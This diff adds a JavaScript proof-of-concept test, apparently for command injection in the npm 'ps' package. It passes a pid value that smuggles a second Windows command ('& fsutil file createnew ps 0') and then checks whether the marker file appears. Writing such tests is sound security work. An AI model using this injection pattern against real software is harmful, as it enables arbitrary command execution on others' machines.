@@ -1,0 +1,23 @@
+// test("Command Injection in ps", (done) => {
+//   expect.assertions(2);
+  const ps = require("ps");
+  const fs = require("fs");
+  const path = "./ps";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+//       console.log("File removed:", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+console.log("{ " + file_exist + ", " + false + " }");
+  ps.lookup({ pid: " & fsutil file createnew ps 0" }, function (err, proc) {
+    file_exist = fs.existsSync(path);
+console.log("{ " + file_exist + ", " + true + " }");
+    fs.unlink(path, function (err) {
+//       done();
+    });
+  });
+// });
